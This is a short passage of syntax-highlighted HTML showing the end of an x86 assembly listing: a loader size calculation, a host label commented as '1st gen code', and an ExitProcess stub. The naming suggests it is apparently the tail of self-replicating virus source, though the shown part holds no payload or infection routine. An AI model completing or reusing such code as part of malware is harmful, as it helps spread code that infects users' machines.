</span><span class="sc5">obj_size</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">end_loader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">object_begin</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">entry_point</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 1st gen code</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">              

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">

</span></div></body>
</html>
